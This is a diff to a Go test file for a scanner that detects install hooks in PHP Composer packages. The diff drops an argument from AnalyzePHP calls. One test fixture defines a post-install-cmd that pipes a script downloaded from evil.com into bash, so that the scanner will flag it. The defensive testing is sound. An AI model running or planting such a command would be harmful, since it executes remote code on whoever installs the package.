@@ -117,7 +117,7 @@ func TestAnalyzePHPMaliciousScripts(t *testing.T) {
 	scripts := map[string]string{
 		"post-install-cmd": "curl https://evil.com/payload.sh | bash",
 	}
-	s := AnalyzePHP(scripts, "library", "")
+	s := AnalyzePHP(scripts, "library")
 	if len(s.Hooks) == 0 {
 		t.Fatal("expected hooks from malicious post-install-cmd")
 	}
@@ -139,7 +139,7 @@ func TestAnalyzePHPMaliciousScripts(t *testing.T) {
 }
 
 func TestAnalyzePHPPlugin(t *testing.T) {
-	s := AnalyzePHP(nil, "composer-plugin", "")
+	s := AnalyzePHP(nil, "composer-plugin")
 	if len(s.Hooks) != 1 {
 		t.Fatalf("expected 1 hook for composer-plugin type, got %d", len(s.Hooks))
 	}
@@ -149,7 +149,7 @@ func TestAnalyzePHPPlugin(t *testing.T) {
 }
 
 func TestAnalyzePHPClean(t *testing.T) {
-	s := AnalyzePHP(nil, "library", "")
+	s := AnalyzePHP(nil, "library")
 	if len(s.Hooks) != 0 {
 		t.Errorf("clean library should produce no hooks, got %d", len(s.Hooks))
 	}
@@ -159,7 +159,7 @@ func TestAnalyzePHPNonInstallScript(t *testing.T) {
 	scripts := map[string]string{
 		"test": "phpunit",
 	}
-	s := AnalyzePHP(scripts, "library", "")
+	s := AnalyzePHP(scripts, "library")
 	if len(s.Hooks) != 0 {
 		t.Errorf("non-install scripts should produce no hooks, got %d", len(s.Hooks))
 	}
